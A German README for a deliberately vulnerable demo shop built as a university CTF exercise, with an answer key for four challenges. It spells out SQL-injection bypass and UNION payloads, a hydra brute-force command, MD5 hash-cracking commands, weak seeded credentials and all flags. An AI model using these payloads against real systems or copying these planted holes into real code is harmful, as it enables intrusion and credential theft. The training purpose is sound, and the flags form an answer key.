# Pressbar – verwundbarer Demo-Shop

Kleiner Kaltpress-Saftladen, der mit Absicht löchrig ist. Gedacht als Spielwiese
für eine Hacking-Präsentation an der Uni, mit vier Aufgaben für CTFd.

Nur Python-Standardbibliothek, keine Abhängigkeiten.

## Starten

### Variante A: direkt
```sh
python3 app.py
```

### Variante B: Docker Compose (für den Server)
```sh
docker compose up -d --build     # bauen & starten
docker compose logs -f           # Zugriffe / Brute-Force live mitlesen
docker compose down              # stoppen
```

Läuft dann auf `http://0.0.0.0:8099` (Port in `.env`). Beim ersten Start wird
`shop.db` automatisch angelegt. Der Server bindet auf `0.0.0.0` für
Port-Forwarding – es gibt bewusst **keinen Rate-Limit- oder DDoS-Schutz**.

Zum Zurücksetzen `shop.db` löschen (bzw. Container neu starten), dann wird neu
befüllt.

**Ports:** In `compose.yml` ist `8099:8099` gemappt. Der linke Wert ist der
Host-Port (frei wählbar), der rechte muss zu `PORT` in `.env` passen. Die `.env`
ist read-only in den Container gemountet – Passwort und Flags lassen sich so
ohne Rebuild ändern.

## Seiten

| Pfad             | Zweck                              | Schutz                        |
|------------------|------------------------------------|-------------------------------|
| `/`              | Startseite, Sorten-Übersicht       | offen                         |
| `/login`         | Anmeldung (SQL-Injection-Ziel)     | offen                         |
| `/account`       | Kundenkonto nach Login             | Login nötig                   |
| `/admin`         | Admin-Übersicht                    | nur Admin (korrekt)           |
| `/admin/orders`  | Bestellliste                       | **offen – kaputt (BAC)**      |
| `/admin/users`   | Benutzerliste mit MD5-Hashes       | **offen – kaputt (BAC)**      |
| `/admin/config`  | Systemkonfiguration                | nur Admin (korrekt)           |

Keine Seite ohne Funktion. Die drei Admin-Unterseiten sind genau die
"2 von 3 offen"-Konstellation aus der Aufgabe.

## Accounts

In `.env`:

- `admin` / `sommer2024` (Rolle admin, schwach → brute-forcebar)

In der DB (siehe `app.py`, `init_db`):

- `kevin` / `pizza123`
- `hartmann` / `letmein`  ← Ziel fürs Hash-Cracking
- `swetlana` / `sunshine`
- `buchhaltung` / `qwertz`

## Die vier Aufgaben (Flags für CTFd)

### 1. SQL-Injection – `/login`
Benutzername und Passwort werden ungeprüft in die SQL-Abfrage gebaut:
`SELECT id, username, role FROM users WHERE username = '…' AND password = '…'`.

- **Auth-Bypass:** Benutzername `admin' OR '1'='1' -- ` , Passwort egal → als admin drin.
- **Error-based:** ein `'` im Feld zeigt die SQL-Fehlermeldung inkl. Query.
- **UNION (Flag aus `vault`):** die Abfrage hat 3 Spalten, die 2. (`username`)
  wird auf der Kontoseite ausgegeben:
  ```
  username:  x' UNION SELECT 1,(SELECT secret FROM vault),'admin' --
  password:  egal
  ```
  Flag: `FLAG{union_select_schmeckt_scharf}`

### 2. Broken Access Control – `/admin/orders`
`/admin` und `/admin/config` prüfen die Rolle, `/admin/orders` und `/admin/users`
**gar nicht**. Einfach die URL direkt aufrufen, ganz ohne Login.

Flag auf `/admin/orders`: `FLAG{kein_tuersteher_am_lager}`

### 3. Brute-Force / Dictionary – `/login`
Kein Rate-Limit. `admin` hat ein schwaches Passwort (`.env`). Dictionary-Attack
gegen das Formular, z. B. mit hydra:

```sh
hydra -l admin -P wordlists/demo.txt 127.0.0.1 -s 8099 \
  http-post-form "/login:username=^USER^&password=^PASS^:Benutzername oder Passwort falsch"
```

(Erfolg = Redirect 303 statt der Fehlermeldung.) Danach als admin die gesperrte
Seite `/admin/config` öffnen.

Flag auf `/admin/config`: `FLAG{sommer_war_keine_gute_idee}`

### 4. Passwort-Cracking – hashcat / john
`/admin/users` leakt alle Passwörter als **ungesalzenes MD5**. Hash von
`hartmann` (`0d107d09f5bbe40cade3de5c71e9e9b7`) knacken:

```sh
echo 0d107d09f5bbe40cade3de5c71e9e9b7 > hash.txt
hashcat -m 0 hash.txt wordlists/demo.txt        # oder rockyou.txt
john --format=raw-md5 --wordlist=wordlists/demo.txt hash.txt
```

Ergibt `letmein`. Damit als `hartmann` einloggen → Flag auf der Kontoseite.

Flag: `FLAG{md5_zerbroeselt_wie_chips}`

## CTFd

`ctfd_challenges.csv` im CTFd-Admin unter *Challenges → Import* (CSV) einlesen.
Enthält Name, Kategorie, Punkte, Flag und Hints pro Aufgabe. Flags stammen 1:1
aus `.env` – wenn du die Werte dort änderst, die CSV anpassen.

## Dateien

- `app.py` – der Server (Shop + alle Schwachstellen)
- `.env` – Admin-Passwort, Flags, Port
- `wordlists/demo.txt` – Wortliste mit den echten Passwörtern (Demo läuft offline)
- `ctfd_challenges.csv` – Import für CTFd
- `Dockerfile`, `compose.yml`, `.dockerignore` – Container-Setup

## Hinweis
Alles hier ist absichtlich unsicher. Nicht ins offene Internet stellen, nur lokal
bzw. hinter Port-Forwarding in einer kontrollierten Umgebung laufen lassen.
